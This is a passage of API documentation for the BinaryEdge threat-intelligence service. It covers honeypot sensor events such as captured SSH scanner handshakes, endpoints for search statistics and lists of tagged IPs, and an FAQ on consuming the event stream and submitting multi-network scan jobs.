    "asn": 4134
  }
}, {
  "target": {
    "port": 22,
    "protocol": "tcp"
  },
  "data": {
    "payload": "\\x00\\x00\\x02\\x84\\x07\\x14t\\x85\\x97.Sf\\x88\\xa3\\x1a\\x7f\\xf7:ZzG\\\\\\x00\\x00\\x00Ydiffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1\\x00\\x00\\x00\\x0fssh-rsa,ssh-dss\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00\\x92aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00Uhmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x04none\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00=@\\x8d71\\xc9&",
    "extra": {
      "ssh": {
        "hassh": "92674389fa1e47a27ddd8d9b63ecd42b",
        "hassh_algorithms": "diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1;aes128-ctr,aes192-ctr,aes256-ctr,aes256-cbc,rijndael-cbc@lysator.liu.se,aes192-cbc,aes128-cbc,blowfish-cbc,arcfour128,arcfour,cast128-cbc,3des-cbc;hmac-sha1,hmac-sha1-96,hmac-md5,hmac-md5-96,hmac-ripemd160,hmac-ripemd160@openssh.com;none"
      }
    },
    "tags": ["SSH_SCANNER"]
  },
  "origin": {
    "ip": "58.242.83.31",
    "type": "sinkhole",
    "ts": 1549625585310,
    "asn": 4837
  }
}
```

#### /v1/query/sensors/search/stats

Statistics of events for the given query. Can be used with specific parameters and/or full-text search.

*Parameters*

* query: [String] String used to query our data. If no filters are used, it will perform a full-text search on the entire events. See [Search Parameters](sensors-search.md) for details on what parameters can be used.
* type: [String] Type of statistic we want to obtain. Possible types include:
    * _ports_, _tags_, _countries_, _asn_, _ips_, _payloads_, _http\_path_, _rdns_.
* days: [Integer] Optional. Number of days to get the stats for. For example, days=1 for the last day of data.
    * Default: _days=30_
* order: [String] Optional. Whether to sort descendently or ascendently to get the top.
    * _desc_, _asc_
    * Default: _order=desc_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/sensors/search/stats?query=tags:ssh_scanner&type=ports' -H 'X-Token:API_TOKEN'
```

```json
[
  {
    "key": "22/tcp",
    "doc_count": 1102752
  }, 
  {
    "key": "2222/tcp",
    "doc_count": 8149
  }, 
  {
    "key": "222/tcp",
    "doc_count": 1970
  }, 
  {
    "key": "4000/tcp",
    "doc_count": 1962
  }, 
  {
    "key": "23/tcp",
    "doc_count": 1552
  }
]
```

#### /v1/query/sensors/tag/<tag>

Get a list of IPs that have been associated with a specific TAG. See [List of Tags](sensors-tags.md)

*Parameters*

* tag: [String] Tag you want to get the list of IPs related to.
    * Example: _tag=MALICIOUS_
* days: [Integer] Query Parameter, number of days to get the stats for. For example, days=1 for the last day of data.
    * Default: _days=1_
    * Max: _days=60_

*Output*

```shell
curl 'https://api.binaryedge.io/v1/query/sensors/tag/MALICIOUS' -H 'X-Token:API_TOKEN'
```

```json
["1.34.221.87", "1.160.38.189", "1.160.39.129", "1.160.91.241", "1.160.130.56", "1.160.160.98", "1.161.118.167"]
```


### FAQ

**Q: What is the sample parameter?**

**A:** The Sample parameter is used to define how many open ports the platform needs to find before stopping the scan. It is useful to test modules and different configurations for each module (that we are adding in the future). This parameter is optional - by default the scan stops only after scanning the entire list of IP addresses and ports.


**Q: How can I consume the stream?**

**A:** The stream outputs to STDOUT, allowing you to consume it in different ways. For example:

- Direct the stream to a file:
    - `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:API_TOKEN' > file.txt`
- Pipe the stream to a custom application you developed to process it:
    - `curl 'https://stream.api.binaryedge.io/v1/stream' -H 'X-Token:API_TOKEN' | application_name `


**Q: What should I do if I get a error 500?**

**A:** In this case, you should contact support@binaryedge.io


**Q: How do I scan multiple hosts with one request?**

**A:**

```json
options: [{
  "targets": ["array of cidrs (string)"],
  "ports": [{
    "port": "int",
    "modules": ["array of module names (string)"],
    "sample": "int"
  }]
}]
```

Example:

```json
{
  "type": "scan",
  "description": "test a bunch of networks",
  "options": [
    {
      "targets": ["xxx.xxx.x.x/xx","xxx.xxx.x.x/xx"],
      "ports": [{
        "port": 995,
        "modules": ["service"]
      },
      {
        "port": 22,
        "modules": ["ssh"]
      }]
    }, {
      "targets": ["xxx.xxx.x.x/xx"],
      "ports": [{
        "port": 5900,
        "modules": ["vnc"]
      }]
    }
  ]
}
```
